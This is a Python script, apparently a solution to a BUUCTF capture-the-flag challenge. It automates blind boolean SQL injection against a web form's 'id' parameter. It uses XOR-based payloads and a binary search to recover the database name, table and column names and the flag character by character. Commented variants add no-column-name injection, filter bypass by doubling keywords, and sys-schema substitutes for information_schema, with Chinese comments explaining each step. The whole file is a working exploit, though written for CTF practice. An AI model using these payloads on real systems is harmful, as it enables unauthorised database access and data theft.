
# -*- coding: utf-8 -*-
# @Date    : 2020-12-18
# @Author  : SuperJason
# @update  : 2021-1-4
import requests
import string
import time

url = 'http://8fc0b691-60ad-4aaa-8c61-64616bc954d5.node3.buuoj.cn/'

trueflag = 'Nu1L'
falseflag = '5728'
dic = string.digits + string.ascii_letters + "!@#$%^&*()_+{}-="


def sql():
    flag = ''
    for i in range(1, 50):
        # 可打印字符的ASCII码在33-128之间
        begin = 32
        end = 127
        while begin < end:
            mid = (end + begin) // 2
            print(begin,mid,end,flag)
            time.sleep(0.2)
            # 爆数据库、数据表、字段
            target = 'database()'
            # target = 'select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()'
            # target = 'select group_concat(column_name) from information_schema.columns where table_name="fl4g"'
            # target = 'select group_concat(password) from fl4g'
            # target = 'select flag from fl4g'

            # and、or、异或
            # payload = "and (ascii(substr(({}),{},1))>{})#".format(target, i, mid)
            payload = "1^1^(ascii(substr(({}),{},1))>{})#".format(target, i, mid) 

            # 无列名注入
            # payload = "1^1^((select 1,'{}') < (select * from f1ag_1s_h3r3_hhhhh))#".format(flag+chr(mid))
            # print(payload)
            #1^1^(ascii(substr((select database()),1, 1))>1)

            # 字符替换
            # payload = payload.replace('from', 'frfromom')
            # payload = payload.replace('select', 'selselectect')
            # payload = payload.replace('or', 'oorr')
            # payload = payload.replace('where', 'whwhereere')

            # 此处需要通过burpsuite等工具获得post的参数名
            data = {
                "id": payload
            }

            res= requests.post(url, data=data)
            print(res.status_code)
            content=res.text
            if trueflag in content:
                begin = mid+1
            else:
                end = mid
        # flag += chr(end)#正常注入不需要-1
        flag += chr(end-1)# 无列名注入需要-1
        print(flag)


if __name__ == "__main__":
    sql()
    pass

# tips：当or被过滤时，information_schema.tables也可以是sys.x$schema_flattened_keys、sys.schema_table_statistics_with_buffer
